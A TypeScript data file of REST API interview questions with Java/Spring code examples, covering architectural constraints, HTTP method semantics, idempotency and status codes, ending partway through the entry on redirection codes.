import type { ConceptualQuestion } from "../conceptual";

export const restApisQuestions: ConceptualQuestion[] = [
  /* ==========================================================================
     1. REST Core & Architectural Constraints
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "what-is-rest-architectural-constraints",
    title: "What is REST and what are its 6 architectural constraints?",
    difficulty: "EASY",
    subtopic: "REST Core",
    synopsis: "Representational State Transfer architectural style defined by 6 core constraints.",
    shortAnswer:
      "REST (Representational State Transfer) is an architectural style for designing networked applications. It defines 6 constraints: 1) Client-Server separation, 2) Statelessness, 3) Cacheability, 4) Layered System, 5) Uniform Interface, and 6) Code on Demand (optional).",
    detailedExplanation: [
      "**Client-Server:** Decouples user interface concerns from data storage concerns, allowing frontend and backend to evolve independently across platforms.",
      "**Stateless:** Each request from client to server must contain all information needed to process it. No client session state is stored on the server.",
      "**Cacheable:** Server responses must explicitly label themselves as cacheable or non-cacheable to prevent clients from reusing stale data.",
      "**Layered System:** A client cannot tell whether it is connected directly to the end server or an intermediate proxy, load balancer, or API gateway.",
      "**Uniform Interface:** Simplifies architecture via standard resource URIs, HTTP verbs, representations (JSON/XML), self-descriptive messages, and HATEOAS.",
      "**Code on Demand (Optional):** Servers can temporarily extend client functionality by transferring executable code (e.g., JavaScript scripts).",
    ],
    example: {
      language: "JAVA",
      code: `// Expressing Uniform Interface and Statelessness in Spring REST Controller
@RestController
@RequestMapping("/api/v1/users")
public class UserController {

    @GetMapping("/{id}")
    public ResponseEntity<UserDto> getUserById(@PathVariable Long id) {
        UserDto user = userService.findById(id);
        return ResponseEntity.ok()
                .cacheControl(CacheControl.maxAge(60, TimeUnit.SECONDS)) // Cacheable
                .body(user);
    }
}`,
    },
    interviewTip:
      "Memorize the 6 constraints. When asked 'Is REST a protocol or an architectural style?', emphasize that REST is an architectural style, while HTTP is the protocol most commonly used to implement it.",
    commonTrap:
      "Confusing REST with HTTP. While REST is almost exclusively implemented over HTTP today, REST principles can theoretically be applied over other transport protocols like MQTT or AMQP.",
    followUpQuestions: [
      "What makes an API RESTful vs RPC-style?",
      "What is the Richardson Maturity Model for REST?",
    ],
    relatedTopics: ["REST APIs", "HTTP", "Architecture"],
    tags: ["REST APIs", "Architecture", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "statelessness-in-rest-apis",
    title: "What is Statelessness in REST APIs and why is it critical for horizontal scaling?",
    difficulty: "EASY",
    subtopic: "REST Core",
    synopsis: "No server-side session state; every HTTP request carries full context.",
    shortAnswer:
      "Statelessness means the server does not store any client context or session state between HTTP requests. Every request must contain all necessary data (e.g., JWT authentication token, parameters). This allows any server instance in a cluster to handle any request, enabling seamless horizontal scaling.",
    detailedExplanation: [
      "**No Server Sessions:** Server memory does not hold HTTP session state (`HttpSession`). Server nodes remain completely stateless.",
      "**Self-Contained Requests:** The client transmits all authentication credentials (JWT bearer token in `Authorization` header) and state in every request.",
      "**Horizontal Scalability:** Because any application instance can process any incoming request, you can add 100 new server nodes behind a load balancer without sticky sessions or session replication.",
      "**Resilience:** If an application server node crashes mid-user flow, another node picks up the next request immediately without user logout.",
    ],
    example: {
      language: "JAVA",
      code: `// Stateless Spring Security Configuration using JWT
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
        .csrf(csrf -> csrf.disable())
        .sessionManagement(session -> 
            session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)) // Disable JSESSIONID
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/auth/**").permitAll()
            .anyRequest().authenticated()
        )
        .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
        .build();
}`,
    },
    interviewTip:
      "Explain that statelessness shifts state management from server memory to either the client (JWT) or distributed storage (Redis). Mention how sticky sessions violate pure REST statelessness.",
    commonTrap:
      "Claiming a RESTful application has no state at all. REST APIs manage Resource State (stored in database); they just avoid storing Client Session State in app server memory.",
    followUpQuestions: [
      "How do JWT tokens enable stateless authentication?",
      "What are the security trade-offs of storing tokens on the client vs server sessions?",
    ],
    relatedTopics: ["REST APIs", "Statelessness", "Scalability", "JWT"],
    tags: ["REST APIs", "Architecture", "Scalability"],
  },
  {
    topicSlug: "rest-apis",
    slug: "rest-vs-soap-comparison",
    title: "What is the difference between REST and SOAP?",
    difficulty: "EASY",
    subtopic: "REST Core",
    synopsis: "Flexible lightweight architectural style vs strict XML protocol with WS-security.",
    shortAnswer:
      "REST is an architectural style using lightweight data formats (JSON, XML, HTML) over HTTP standard verbs. SOAP (Simple Object Access Protocol) is a strict W3C protocol using XML envelopes over HTTP/SMTP, enforcing rigid contracts via WSDL and advanced enterprise security (WS-Security).",
    detailedExplanation: [
      "**Data Payload:** REST prefers lightweight JSON (or XML/YAML). SOAP strictly requires verbose XML wrapped in `<soap:Envelope>`, `<soap:Header>`, and `<soap:Body>`.",
      "**Contract & Schema:** SOAP relies on WSDL (Web Services Description Language) for strict type definitions. REST uses OpenAPI (Swagger) or JSON Schema, which are optional and flexible.",
      "**State & Standards:** SOAP has built-in enterprise standards like WS-Security, WS-ReliableMessaging, and WS-AtomicTransaction. REST relies on underlying HTTP transport security (HTTPS, TLS) and JWTs.",
      "**Performance:** REST has lower bandwidth overhead and faster serialization, making it ideal for web and mobile apps. SOAP has higher XML parsing overhead.",
    ],
    example: {
      language: "JAVA",
      code: `// SOAP Request Payload (Verbose XML Envelope)
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:user="http://example.com/user">
   <soapenv:Header/>
   <soapenv:Body>
      <user:GetUserRequest>
         <user:id>42</user:id>
      </user:GetUserRequest>
   </soapenv:Body>
</soapenv:Envelope>
*/

// REST Request (Lightweight HTTP GET)
// GET /api/v1/users/42 HTTP/1.1
// Accept: application/json`,
    },
    interviewTip:
      "Use this concise summary: 'REST is an architectural style that leverages standard HTTP protocols and flexible JSON; SOAP is a strict XML-based protocol designed for legacy enterprise banking security standards.'",
    commonTrap:
      "Saying 'SOAP can use JSON'. SOAP is strictly XML-based. Only REST and RPC alternatives support JSON.",
    followUpQuestions: [
      "When would an enterprise still choose SOAP over REST today?",
      "What is WSDL and how does client code generation work?",
    ],
    relatedTopics: ["REST APIs", "SOAP", "XML", "JSON"],
    tags: ["REST APIs", "Protocols", "SOAP"],
  },
  {
    topicSlug: "rest-apis",
    slug: "uniform-interface-constraint-explained",
    title: "What is the Uniform Interface constraint in REST APIs?",
    difficulty: "MEDIUM",
    subtopic: "REST Core",
    synopsis: "Standardized resource identification, manipulation through representations, and self-descriptive messages.",
    shortAnswer:
      "The Uniform Interface constraint simplifies system architecture by decoupling clients from server implementation through 4 fundamental sub-constraints: Resource Identification, Manipulation through Representations, Self-Descriptive Messages, and HATEOAS.",
    detailedExplanation: [
      "**Resource Identification in Requests:** Individual resources are identified using URI paths (`/users/123`), separate from the internal representation returned to the client.",
      "**Manipulation through Representations:** When a client holds a representation of a resource (e.g. JSON object), it has enough information to modify or delete the resource on the server.",
      "**Self-Descriptive Messages:** Each message includes enough information to describe how to process it (e.g. `Content-Type: application/json` tells the parser how to decode the payload).",
      "**Hypermedia as the Engine of Application State (HATEOAS):** Clients make state transitions by discovering dynamic hypermedia links returned in server responses.",
    ],
    example: {
      language: "JAVA",
      code: `// Self-descriptive Response with Media Type and HATEOAS Links
// HTTP/1.1 200 OK
// Content-Type: application/hal+json

{
  "id": 101,
  "name": "Niraj Mehta",
  "email": "niraj@example.com",
  "_links": {
    "self": { "href": "/api/v1/users/101" },
    "orders": { "href": "/api/v1/users/101/orders" }
  }
}`,
    },
    interviewTip:
      "Highlight that the Uniform Interface is what makes REST APIs intuitive and language-agnostic across web browsers, mobile clients, and third-party integrations.",
    commonTrap:
      "Confusing resource URI with database schema. Resource representations exposed via URIs should be domain abstractions, not 1-to-1 database table dumps.",
    followUpQuestions: [
      "What is HATEOAS and why is it rarely fully implemented in industry?",
      "What are media types (MIME types) in self-descriptive messages?",
    ],
    relatedTopics: ["REST APIs", "Uniform Interface", "HATEOAS"],
    tags: ["REST APIs", "Architecture"],
  },
  {
    topicSlug: "rest-apis",
    slug: "client-server-layered-system-constraints",
    title: "How do Client-Server and Layered System constraints work in REST?",
    difficulty: "EASY",
    subtopic: "REST Core",
    synopsis: "Decoupling user experience from data storage, and allowing intermediate proxy/gateway layers.",
    shortAnswer:
      "Client-Server separates user UI/state concerns from server data storage concerns. Layered System allows intermediate network components (API Gateways, Load Balancers, CDN Caches, Security Proxies) to sit between client and server without requiring any code changes from the client.",
    detailedExplanation: [
      "**Client-Server Decoupled Evolution:** Frontend web apps (React) or mobile apps (iOS) can completely overhaul their UI without touching backend business logic.",
      "**Layered System Separation:** Intermediaries like Cloudflare CDN, Nginx reverse proxy, OAuth 2.0 Auth Gateways, and WAF (Web Application Firewall) operate transparently.",
      "**Security & Encapsulation:** Layered systems allow security policies to be enforced at the perimeter (WAF/Gateway) so backend microservices don't duplicate authentication code.",
    ],
    example: {
      language: "JAVA",
      code: `// Client sends request to API Gateway; unaware of backend topology
// GET https://api.company.com/v1/orders
// Path: Client -> Cloudflare CDN -> Nginx Gateway -> Spring Boot Service -> PostgreSQL DB`,
    },
    interviewTip:
      "Mention that the Layered System constraint is what makes modern microservice architectures, cloud API Gateways (AWS API Gateway, Kong), and CDN caching possible.",
    commonTrap:
      "Assuming the client directly talks to the database host. The client strictly interacts with abstract HTTPS endpoints across intermediate layers.",
    followUpQuestions: [
      "What is the role of an API Gateway in a layered REST architecture?",
      "How do reverse proxies handle TLS termination?",
    ],
    relatedTopics: ["REST APIs", "API Gateway", "Architecture"],
    tags: ["REST APIs", "Architecture", "Microservices"],
  },
  {
    topicSlug: "rest-apis",
    slug: "code-on-demand-constraint",
    title: "What is the Code on Demand constraint in REST APIs?",
    difficulty: "EASY",
    subtopic: "REST Core",
    synopsis: "Optional constraint where server sends executable code (scripts, applets) to client.",
    shortAnswer:
      "Code on Demand is the only optional constraint in REST. It allows servers to temporarily extend or customize client functionality by delivering executable code (such as JavaScript scripts or WebAssembly binaries) for the client to execute locally.",
    detailedExplanation: [
      "**Dynamic Functionality:** Server transfers executable logic to the client, reducing the number of pre-compiled features required on the client side.",
      "**Web Browser Paradigm:** Browsers fetching `<script src='app.js'>` tag from a web server and executing JavaScript is the classic implementation of Code on Demand.",
      "**Security Risk:** Downloading and executing code dynamically increases security risks (XSS, arbitrary code execution) if untrusted servers are involved.",
    ],
    example: {
      language: "JAVA",
      code: `// Example: API returning dynamic JavaScript validation logic
// GET /api/v1/form-validation.js
// Response Content-Type: application/javascript

function validateEmail(email) {
    return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email);
}`,
    },
    interviewTip:
      "Emphasize that Code on Demand is the ONLY optional constraint in REST architecture and is rarely used in backend REST API design due to security concerns.",
    commonTrap:
      "Believing Code on Demand is mandatory for an API to be considered RESTful.",
    followUpQuestions: [
      "Why is Code on Demand considered optional in REST?",
      "How does WebAssembly (Wasm) revive the concept of Code on Demand?",
    ],
    relatedTopics: ["REST APIs", "Web Security", "JavaScript"],
    tags: ["REST APIs", "Architecture"],
  },

  /* ==========================================================================
     2. HTTP Methods, Semantics & Idempotency
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "http-methods-semantics-overview",
    title: "What are the primary HTTP methods in REST APIs and their semantics?",
    difficulty: "EASY",
    subtopic: "HTTP Methods",
    synopsis: "GET (read), POST (create), PUT (replace), PATCH (update), DELETE (remove), OPTIONS/HEAD.",
    shortAnswer:
      "Standard HTTP verbs define actions on resource URIs: GET retrieves resources, POST creates new child resources, PUT replaces existing resources completely, PATCH applies partial modifications, DELETE removes resources, HEAD fetches headers only, and OPTIONS lists supported methods.",
    detailedExplanation: [
      "**GET:** Safe and idempotent. Fetches resource representation. Must not alter server state.",
      "**POST:** Unsafe and non-idempotent. Creates a new sub-resource or triggers server-side processing.",
      "**PUT:** Unsafe but idempotent. Overwrites the target resource completely at a client-defined URI.",
      "**PATCH:** Unsafe and non-idempotent (by default). Applies partial fields updates to a resource.",
      "**DELETE:** Unsafe but idempotent. Removes the specified resource URI.",
      "**HEAD:** Same as GET, but server returns only response headers (no response body). Used to check file size (`Content-Length`) or existence.",
      "**OPTIONS:** Queries the server for allowed HTTP methods and CORS policies for a target URI.",
    ],
    example: {
      language: "JAVA",
      code: `@RestController
@RequestMapping("/api/v1/products")
public class ProductController {

    @GetMapping("/{id}")
    public Product getProduct(@PathVariable Long id) { return productService.get(id); }

    @PostMapping
    @ResponseStatus(HttpStatus.CREATED)
    public Product createProduct(@RequestBody Product p) { return productService.create(p); }

    @PutMapping("/{id}")
    public Product updateProduct(@PathVariable Long id, @RequestBody Product p) { return productService.replace(id, p); }

    @PatchMapping("/{id}")
    public Product patchProduct(@PathVariable Long id, @RequestBody Map<String, Object> fields) { return productService.patch(id, fields); }

    @DeleteMapping("/{id}")
    @ResponseStatus(HttpStatus.NO_CONTENT)
    public void deleteProduct(@PathVariable Long id) { productService.delete(id); }
}`,
    },
    interviewTip:
      "Map each HTTP verb to CRUD: GET=Read, POST=Create, PUT/PATCH=Update, DELETE=Delete. Clarify that HTTP verbs represent intent, not execution implementation.",
    commonTrap:
      "Using GET requests to perform data mutations (e.g. `GET /users/delete?id=5`). This breaks browser prefetching and search crawler indexing.",
    followUpQuestions: [
      "What is the difference between safe and idempotent HTTP methods?",
      "Why does HTTP HEAD not return a response body?",
    ],
    relatedTopics: ["REST APIs", "HTTP Methods", "CRUD"],
    tags: ["REST APIs", "HTTP", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "difference-between-put-and-post",
    title: "What is the difference between PUT and POST in REST APIs?",
    difficulty: "EASY",
    subtopic: "HTTP Methods",
    synopsis: "Resource creation at server URI (POST) vs complete resource replacement at known URI (PUT).",
    shortAnswer:
      "POST is used to create a new child resource; the server generates the URI (`/users` -> creates `/users/101`). POST is non-idempotent. PUT is used to replace an existing resource at a known client-specified URI (`PUT /users/101`). PUT is idempotent.",
    detailedExplanation: [
      "**URI Responsibility:** In POST, the URI represents a collection (`POST /orders`); the server decides the newly created resource ID. In PUT, the URI explicitly targets the exact resource (`PUT /orders/order-99`).",
      "**Idempotency:** Executing `POST /orders` 5 times creates 5 distinct order records. Executing `PUT /orders/order-99` 5 times with identical payload leaves `order-99` in the exact same state.",
      "**Payload Contract:** PUT requires sending the full resource representation to overwrite the entity. Omitting a field in PUT usually resets it to null or default value.",
    ],
    example: {
      language: "JAVA",
      code: `// POST: Create (Server assigns ID 501)
// POST /api/v1/users
// Body: { "name": "Alice", "email": "alice@example.com" }
// Response 201 Created: Location: /api/v1/users/501

// PUT: Full Replace (Client specifies ID 501)
// PUT /api/v1/users/501
// Body: { "name": "Alice Smith", "email": "alice.smith@example.com" }
// Response 200 OK or 204 No Content`,
    },
    interviewTip:
      "Remember the golden rule: POST creates under a container URI; PUT overwrites at a specific resource URI. POST is non-idempotent; PUT is idempotent.",
    commonTrap:
      "Using PUT for partial updates. If a client sends only `{ 'name': 'Bob' }` in a PUT request, omitting email, a strict REST implementation will erase the email field.",
    followUpQuestions: [
      "How do you handle partial updates without erasing missing fields?",
      "Can PUT be used to create a resource if the client determines the ID upfront?",
    ],
    relatedTopics: ["REST APIs", "HTTP Methods", "Idempotency"],
    tags: ["REST APIs", "HTTP", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "difference-between-put-and-patch",
    title: "What is the difference between PUT and PATCH in REST APIs?",
    difficulty: "EASY",
    subtopic: "HTTP Methods",
    synopsis: "Full resource replacement (PUT) vs partial attribute modification (PATCH).",
    shortAnswer:
      "PUT performs a complete replacement of the target resource payload. You must supply all fields of the object. PATCH performs partial updates, modifying only the fields explicitly supplied in the request body without touching unmentioned fields.",
    detailedExplanation: [
      "**PUT (Full Overwrite):** Client sends the entire resource schema. Missing fields are considered cleared/nulled.",
      "**PATCH (Partial Modification):** Client sends only the changed delta (e.g. `{ 'email': 'new@example.com' }`). Other fields remain untouched on the database record.",
      "**Idempotency Difference:** PUT is guaranteed idempotent. PATCH is conditionally idempotent—modifying an absolute value (`PATCH { status: 'ACTIVE' }`) is idempotent, but modifying a relative counter (`PATCH { loginCount: +1 }`) is non-idempotent.",
    ],
    example: {
      language: "JAVA",
      code: `// Target User Object in Database: { id: 42, name: "John", status: "PENDING", age: 30 }

// PUT /users/42 (Must include all fields)
// Body: { name: "John Doe", status: "ACTIVE", age: 30 }

// PATCH /users/42 (Only send delta)
// Body: { status: "ACTIVE" }`,
    },
    interviewTip:
      "Mention JSON Patch (RFC 6902) and JSON Merge Patch (RFC 7396) as standard formats for implementing PATCH endpoints cleanly in enterprise APIs.",
    commonTrap:
      "Assuming PATCH is automatically idempotent. Incremental operations inside PATCH break idempotency.",
    followUpQuestions: [
      "What is JSON Merge Patch vs JSON Patch?",
      "How do you distinguish between a client sending null to erase a field vs omitting a field in PATCH?",
    ],
    relatedTopics: ["REST APIs", "HTTP Methods", "JSON Patch"],
    tags: ["REST APIs", "HTTP", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "idempotency-in-rest-apis",
    title: "What is Idempotency in REST APIs and which HTTP methods are idempotent?",
    difficulty: "EASY",
    subtopic: "HTTP Methods",
    synopsis: "Producing identical server state regardless of single or multiple execution calls.",
    shortAnswer:
      "An HTTP method is idempotent if executing a request multiple times produces the exact same server side-effects as executing it once. GET, HEAD, OPTIONS, PUT, and DELETE are idempotent. POST is NOT idempotent (multiple POST requests create multiple duplicate resources).",
    detailedExplanation: [
      "**Idempotent Methods:**",
      "- **GET / HEAD / OPTIONS:** Safe and idempotent. Reading a resource 1 time or 100 times leaves server state unchanged.",
      "- **PUT:** Idempotent. Replaces a resource at a specified URI (`PUT /users/42` with `{ name: 'Bob' }`). Executing 10 times results in `name = 'Bob'`.",
      "- **DELETE:** Idempotent. Deleting `DELETE /users/42` 10 times ensures user 42 is removed. (Response status may change from 204 No Content to 404 Not Found, but server state remains unchanged).",
      "**Non-Idempotent Methods:**",
      "- **POST:** Submits data to create a new resource (`POST /orders`). Submitting 3 times creates 3 distinct orders with unique IDs.",
      "- **PATCH:** Conditionally idempotent depending on implementation. Modifying a relative field (`PATCH /account { addBalance: 50 }`) is NOT idempotent.",
    ],
    example: {
      language: "JAVA",
      code: `// Idempotent Payment Request using Idempotency-Key Header
@PostMapping("/payments")
public ResponseEntity<Payment> processPayment(
    @RequestHeader("Idempotency-Key") String idempotencyKey,
    @RequestBody PaymentRequest request) {

    // Check if idempotencyKey was already processed in Redis/DB
    if (idempotencyCache.has(idempotencyKey)) {
        return ResponseEntity.ok(idempotencyCache.get(idempotencyKey)); // Return cached response!
    }

    Payment payment = paymentService.charge(request);
    idempotencyCache.save(idempotencyKey, payment);
    return ResponseEntity.status(HttpStatus.CREATED).body(payment);
}`,
    },
    interviewTip:
      "A classic system design interview question is 'How do you make POST payment APIs idempotent?'. Name using an `Idempotency-Key` header with Redis lookup to prevent double-charging users during network retry timeouts.",
    commonTrap:
      "Confusing HTTP response status codes with idempotency. DELETE returning 404 on the second call is still idempotent because the database state is unchanged.",
    followUpQuestions: [
      "How do Idempotency Keys work in Stripe API?",
      "Difference between PUT and PATCH?",
      "What is the difference between safe methods and idempotent methods?",
    ],
    relatedTopics: ["REST APIs", "HTTP Methods", "Idempotency"],
    tags: ["REST APIs", "HTTP", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "safe-vs-idempotent-http-methods",
    title: "What is the difference between Safe HTTP methods and Idempotent HTTP methods?",
    difficulty: "EASY",
    subtopic: "HTTP Methods",
    synopsis: "Read-only operations without side-effects (Safe) vs operations with repeatable side-effects (Idempotent).",
    shortAnswer:
      "Safe methods are strictly read-only operations that do not alter server state (GET, HEAD, OPTIONS). All safe methods are inherently idempotent. Idempotent methods may mutate server state (PUT, DELETE), but executing them N times results in the exact same state as 1 execution.",
    detailedExplanation: [
      "**Safe Methods (GET, HEAD, OPTIONS):** Do not modify any server data. Web crawlers and CDNs can prefetch safe URLs freely without corrupting database records.",
      "**Idempotent but Unsafe (PUT, DELETE):** Mutate server state on first execution, but subsequent executions leave state identical.",
      "**Unsafe and Non-Idempotent (POST):** Mutates state and produces distinct side-effects on every execution.",
    ],
    example: {
      language: "JAVA",
      code: `// Safe Method: Reading user stats (No side effects)
// GET /users/42/stats -> Safe & Idempotent

// Unsafe but Idempotent: Soft Deleting user
// DELETE /users/42 -> Server state becomes is_deleted = true. Executing 10x keeps is_deleted = true.

// Unsafe & Non-Idempotent: Appending comment
// POST /articles/10/comments -> Appends a new comment on every invocation.`,
    },
    interviewTip:
      "Use a Venn diagram explanation: 'All Safe methods are Idempotent, but NOT all Idempotent methods are Safe (e.g. PUT and DELETE mutate state).'",
    commonTrap:
      "Assuming logging or tracking analytics on a GET request makes it unsafe. Infrastructure logging is not considered a domain resource state mutation.",
    followUpQuestions: [
      "Why is HTTP GET considered safe if it increments an access counter in Redis?",
      "How do browser crawlers abuse non-compliant GET endpoints?",
    ],
    relatedTopics: ["REST APIs", "HTTP Methods", "Security"],
    tags: ["REST APIs", "HTTP"],
  },
  {
    topicSlug: "rest-apis",
    slug: "http-options-and-head-methods",
    title: "How do HTTP OPTIONS and HEAD methods work in REST APIs?",
    difficulty: "MEDIUM",
    subtopic: "HTTP Methods",
    synopsis: "Preflight capability inspection (OPTIONS) and header metadata retrieval without body (HEAD).",
    shortAnswer:
      "HTTP OPTIONS queries the server to discover supported HTTP methods, headers, and CORS security policies for a URI. HTTP HEAD requests the exact same headers as a GET request, but instructs the server to omit the response body.",
    detailedExplanation: [
      "**HTTP OPTIONS (CORS Preflight):** Modern browsers automatically issue an `OPTIONS` preflight request before making cross-origin requests with custom headers or unsafe methods (`PUT`, `DELETE`). The server responds with `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers`.",
      "**HTTP HEAD (Metadata Inspection):** Clients use HEAD to inspect `Content-Length` (to verify file download size before fetching), `Last-Modified` or `ETag` (to validate cache freshness), or `Content-Type` without downloading multi-megabyte payloads.",
    ],
    example: {
      language: "JAVA",
      code: `// Curl inspecting file headers via HEAD
// $ curl -I https://api.example.com/downloads/v2.1.zip
// HTTP/1.1 200 OK
// Content-Type: application/zip
// Content-Length: 524288000
// ETag: "a8f9c10b"

// Browser OPTIONS preflight request header check
// OPTIONS /api/v1/orders HTTP/1.1
// Origin: https://frontend.example.com
// Access-Control-Request-Method: DELETE`,
    },
    interviewTip:
      "Mention that HTTP HEAD is ideal for lightweight health checks and link availability checkers, while OPTIONS is the foundation of web browser CORS security.",
    commonTrap:
      "Returning a body in response to an HTTP HEAD request. RFC 9110 strictly forbids returning a body payload for HEAD requests.",
    followUpQuestions: [
      "What happens if an API Gateway drops OPTIONS preflight requests?",
      "How to implement an efficient HTTP HEAD handler in Spring MVC?",
    ],
    relatedTopics: ["REST APIs", "CORS", "HTTP"],
    tags: ["REST APIs", "HTTP", "CORS"],
  },

  /* ==========================================================================
     3. HTTP Status Codes & Error Handling
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "http-status-codes-overview",
    title: "What are HTTP Status Codes in REST APIs and how are they categorized?",
    difficulty: "EASY",
    subtopic: "Status Codes",
    synopsis: "Standard 3-digit numerical response status indicators grouped into 5 distinct categories.",
    shortAnswer:
      "HTTP status codes communicate request outcomes. They are categorized into 5 ranges: 1xx (Informational), 2xx (Success), 3xx (Redirection), 4xx (Client Error), and 5xx (Server Error).",
    detailedExplanation: [
      "**1xx Informational:** Request received, continuing process (e.g. `100 Continue`, `101 Switching Protocols`).",
      "**2xx Success:** Request successfully received, understood, and accepted (`200 OK`, `201 Created`, `202 Accepted`, `204 No Content`).",
      "**3xx Redirection:** Further client action required (`301 Moved Permanently`, `302 Found`, `304 Not Modified`).",
      "**4xx Client Error:** Client sent invalid request or lacks credentials (`400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `409 Conflict`, `422 Unprocessable Entity`, `429 Too Many Requests`).",
      "**5xx Server Error:** Server failed to fulfill valid request (`500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`, `504 Gateway Timeout`).",
    ],
    example: {
      language: "JAVA",
      code: `@GetMapping("/orders/{id}")
public ResponseEntity<Order> getOrder(@PathVariable String id) {
    Order order = orderService.find(id);
    if (order == null) {
        return ResponseEntity.status(HttpStatus.NOT_FOUND).build(); // 404
    }
    return ResponseEntity.ok(order); // 200
}`,
    },
    interviewTip:
      "Never return 200 OK with `{ 'error': 'User not found' }` in the body! Using proper 4xx/5xx HTTP status codes allows gateways, CDNs, and clients to interpret failures standardly.",
    commonTrap:
      "Confusing 401 Unauthorized (missing/invalid credentials) with 403 Forbidden (authenticated user lacks permissions).",
    followUpQuestions: [
      "When should an API return 202 Accepted instead of 200 OK?",
      "What is the difference between 502 Bad Gateway and 504 Gateway Timeout?",
    ],
    relatedTopics: ["REST APIs", "HTTP Status Codes", "Error Handling"],
    tags: ["REST APIs", "HTTP"],
  },
  {
    topicSlug: "rest-apis",
    slug: "difference-401-unauthorized-vs-403-forbidden",
    title: "What is the difference between 401 Unauthorized and 403 Forbidden status codes?",
    difficulty: "EASY",
    subtopic: "Status Codes",
    synopsis: "Unauthenticated identity failure (401) vs authorized identity lacking permission (403).",
    shortAnswer:
      "401 Unauthorized means the client has NOT authenticated or provided invalid authentication credentials (missing/expired JWT token). 403 Forbidden means the server recognizes the client's identity, but the client does NOT have permission to access the requested resource.",
    detailedExplanation: [
      "**401 Unauthorized (Unauthenticated):** Who are you? The request lacks valid authentication credentials in the `Authorization` header. Server response should include `WWW-Authenticate` header.",
      "**403 Forbidden (Unauthorized Role):** I know who you are, but you cannot enter. The user is logged in (e.g. Role = 'USER'), but attempts to perform an admin action (`DELETE /api/v1/system/reset`). Re-authenticating will not solve the issue.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Security Access Control
// 401 Unauthorized: Triggered when token is missing or expired
// 403 Forbidden: Triggered when token is valid but user lacks @PreAuthorize("hasRole('ADMIN')")

@DeleteMapping("/system/purge")
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<Void> purgeData() {
    systemService.purge();
    return ResponseEntity.noContent().build();
}`,
    },
    interviewTip:
      "Remember: 401 is an Authentication issue ('Log in first'); 403 is an Authorization issue ('You don't have the role for this').",
    commonTrap:
      "Returning 404 Not Found instead of 403 Forbidden when trying to hide the existence of restricted admin resources for security paranoia.",
    followUpQuestions: [
      "When is returning 404 Not Found instead of 403 Forbidden security best practice?",
      "What header should accompany a 401 Unauthorized response?",
    ],
    relatedTopics: ["REST APIs", "Security", "Authentication"],
    tags: ["REST APIs", "Security", "HTTP"],
  },
  {
    topicSlug: "rest-apis",
    slug: "difference-400-bad-request-vs-422-unprocessable-entity",
    title: "What is the difference between 400 Bad Request and 422 Unprocessable Entity?",
    difficulty: "EASY",
    subtopic: "Status Codes",
    synopsis: "Malformed syntax / JSON parsing error (400) vs syntactically valid JSON failing business validation (422).",
    shortAnswer:
      "400 Bad Request indicates malformed request syntax (e.g. invalid JSON syntax, missing required HTTP headers). 422 Unprocessable Entity indicates that the request JSON syntax is perfectly valid, but the server cannot process the contained instructions due to semantic business validation errors (e.g. negative age, invalid email string).",
    detailedExplanation: [
      "**400 Bad Request (Syntax Error):** The HTTP parser failed. Invalid JSON structure (missing closing brace `}`), unparseable query params, or malformed multipart data.",
      "**422 Unprocessable Entity (Semantic Error):** The JSON parsed cleanly into a DTO object, but domain validation constraints failed (`@NotNull`, `@Email`, `@Min(18)`).",
    ],
    example: {
      language: "JAVA",
      code: `// 400 Bad Request payload (JSON Syntax broken)
// { "name": "Niraj", "email": }

// 422 Unprocessable Entity payload (Syntax valid, validation failed)
// Request: { "age": -5, "email": "invalid-email" }
// Response 422:
{
  "status": 422,
  "title": "Unprocessable Entity",
  "errors": [
    { "field": "age", "message": "Must be greater than 0" },
    { "field": "email", "message": "Must be a valid email format" }
  ]
}`,
    },
    interviewTip:
      "Mention RFC 7807 (Problem Details) as the standard JSON structure used to format validation errors in 422 or 400 responses.",
    commonTrap:
      "Returning 500 Internal Server Error when user inputs fail bean validation. Validation failures are strictly 4xx client errors.",
    followUpQuestions: [
      "How to catch MethodArgumentNotValidException in Spring `@RestControllerAdvice`?",
      "What is RFC 7807 Problem Details?",
    ],
    relatedTopics: ["REST APIs", "Validation", "HTTP Status Codes"],
    tags: ["REST APIs", "HTTP", "Validation"],
  },
  {
    topicSlug: "rest-apis",
    slug: "http-redirection-status-codes-301-302-307-308",
    title: "What is the difference between 301, 302, 307, and 308 HTTP Redirection status codes?",
    difficulty: "MEDIUM",
    subtopic: "Status Codes",
    synopsis: "Permanent vs temporary redirects, and preserving original POST/PUT HTTP methods across redirects.",
    shortAnswer:
      "301 (Permanent) and 302 (Found/Temporary) allow web browsers to historically rewrite original POST requests to GET during redirection. 307 (Temporary Redirect) and 308 (Permanent Redirect) strictly guarantee that the HTTP method (POST, PUT) and request body are preserved unchanged when redirecting.",
    detailedExplanation: [
      "**301 Moved Permanently:** Permanent redirect. Search engines update SEO index to the target URI. Browsers cache redirect aggressively. Legacy browsers often change POST to GET.",
      "**302 Found (Temporary Redirect):** Temporary redirect. SEO index stays on original URL. Legacy browsers rewrite POST to GET.",
      "**307 Temporary Redirect:** Temporary redirect that strictly preserves the original HTTP method and body payload (POST stays POST).",
      "**308 Permanent Redirect:** Permanent redirect that strictly preserves the original HTTP method and body payload (POST stays POST).",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Redirecting POST request while preserving POST method using 307
@PostMapping("/legacy/submit")
public ResponseEntity<Void> redirectLegacySubmit() {
    HttpHeaders headers = new HttpHeaders();
    headers.setLocation(URI.create("/api/v2/submit"));
